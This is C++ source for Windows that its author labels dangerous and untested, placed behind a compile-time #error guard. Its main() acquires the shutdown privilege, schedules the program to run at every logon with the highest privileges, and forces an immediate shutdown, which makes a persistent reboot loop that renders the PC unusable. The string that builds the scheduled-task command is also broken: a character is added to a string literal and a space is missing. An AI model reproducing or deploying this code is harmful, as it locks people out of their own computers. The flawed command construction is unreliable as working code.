// Please NEVER run this. This is actually dangerous and could cause your computer to become unusable (if it works. I don't have a vm to test it rn)

// #define I_UNDERSTAND_THE_RISKS

#ifndef I_UNDERSTAND_THE_RISKS
#error "DANGEROUS FILE: Read and understand this code before compiling. This could render your PC unusable"
#endif

#pragma message("WARNING: This file is destructive and should only be run in closed environments.")

#include <cstdlib>
#include <iostream>
#include <windows.h>

bool EnableShutdownPrivilege() {
    HANDLE hToken;
    TOKEN_PRIVILEGES tkp;

    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken)) return false;

    LookupPrivilegeValue(NULL, SE_SHUTDOWN_NAME, &tkp.Privileges[0].Luid);

    tkp.PrivilegeCount = 1;
    tkp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

    AdjustTokenPrivileges(hToken, FALSE, &tkp, 0, NULL, 0);

    return (GetLastError() == ERROR_SUCCESS);
}

int main() {
    if (!EnableShutdownPrivilege()) {
        std::cerr << "Failed to enable shutdown privilege." << std::endl;
        return 1;
    }

    char path[MAX_PATH];
    DWORD len = GetModuleFileNameA(NULL, path, MAX_PATH);
    std::string exePath(path, len);
    std::string cmd = "schtasks /create /tn MyApp /tr " + '"' + exePath + '"' + "/sc onlogon /rl highest";

    system(cmd.c_str());

    if (!ExitWindowsEx(EWX_SHUTDOWN | EWX_FORCE, SHTDN_REASON_MAJOR_OTHER)) {
        std::cerr << "Shutdown failed. Error: " << GetLastError() << std::endl;
    }

    return 0;
}